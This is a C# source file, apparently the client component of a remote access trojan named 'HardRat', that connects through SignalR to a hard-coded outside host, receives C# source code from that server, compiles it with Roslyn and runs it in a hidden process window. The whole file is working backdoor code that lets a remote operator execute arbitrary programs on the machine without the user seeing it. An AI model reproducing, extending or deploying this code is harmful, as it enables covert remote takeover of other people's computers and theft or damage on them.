using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Text;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace HardRat.ClientApp
{
    public class ServerHubConnection
    {
        private const string Url = "http://edsparro-001-site1.btempurl.com/hubs/serverhub";
        public ServerHubConnection()
        {
            HubConnection = new HubConnectionBuilder()
                .WithUrl(Url)
                .WithAutomaticReconnect()
                .Build();

            HubConnection.On<string, string[]>("ExecuteCode", async (code, assemblies) =>
            {
                Console.WriteLine(code);
                await RunCode(code, assemblies);
            });
            
        }
        public HubConnection HubConnection { get; }

        public async Task StartAsync()
        {
            await HubConnection.StartAsync();
        }

        public Task RunCode(string code, string[] assemblies)
        {
            List<MetadataReference> metadataAssemblies = new List<MetadataReference>(assemblies.Length);
            
            foreach (var assemblyName in assemblies)
            {
                var foundAssembly = CodeCompilerExtensions.FindAssembly(assemblyName);
                metadataAssemblies.Add(MetadataReference.CreateFromFile(foundAssembly));
            }
            var dotNetCoreDir = Path.GetDirectoryName(typeof(object).GetTypeInfo().Assembly.Location);

            metadataAssemblies.Add(MetadataReference.CreateFromFile(Path.Combine(dotNetCoreDir, "System.Runtime.dll")));

            var found = CodeCompilerExtensions.Compile(code, metadataAssemblies.ToArray());

            var startInfo = new ProcessStartInfo()
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = found,
                FileName = "dotnet"
            };

            Process.Start(startInfo).WaitForExit();

            return Task.CompletedTask;
        }
    }

    public static class CodeCompilerExtensions
    {
        public static string Compile(string code, params MetadataReference[] refrences)
        {
            const string name = "Template.dll";
            var syntaxTree = SyntaxFactory.ParseSyntaxTree(SourceText.From(code));

            string assemblyName = Path.Combine(Environment.CurrentDirectory, Path.ChangeExtension(name, "exe"));

            var compilation = CSharpCompilation.Create(name)
                .WithOptions(new CSharpCompilationOptions(OutputKind.ConsoleApplication))
                .AddReferences(
                    refrences
                )
                .AddSyntaxTrees(syntaxTree);

            var result = compilation.Emit(assemblyName);

            File.WriteAllText(
Path.ChangeExtension(assemblyName, "runtimeconfig.json"),
GenerateRuntimeConfig()
);
            if (result.Success)
                return assemblyName;

            Console.WriteLine(string.Join(
                Environment.NewLine,
                result.Diagnostics.Select(diagnostic => diagnostic.ToString())
            ));
            throw new Exception();
        }

        public static string FindAssembly(string name)
        {
            string[] assemblyPaths = System.IO.Directory.GetFiles(@"C:\Windows\Microsoft.NET\", "*.dll", System.IO.SearchOption.AllDirectories);

            return Path.GetFullPath(assemblyPaths.FirstOrDefault(c => Path.GetFileName(c) == name));
        }


        private static string GenerateRuntimeConfig()
        {
            using (var stream = new MemoryStream())
            {
                using (var writer = new Utf8JsonWriter(
                    stream,
                    new JsonWriterOptions() { Indented = true }
                ))
                {
                    writer.WriteStartObject();
                    writer.WriteStartObject("runtimeOptions");
                    writer.WriteStartObject("framework");
                    writer.WriteString("name", "Microsoft.NETCore.App");
                    writer.WriteString(
                        "version",
                        RuntimeInformation.FrameworkDescription.Replace(".NET Core ", "")
                    );
                    writer.WriteEndObject();
                    writer.WriteEndObject();
                    writer.WriteEndObject();
                }

                return Encoding.UTF8.GetString(stream.ToArray());
            }
        }
    }
}
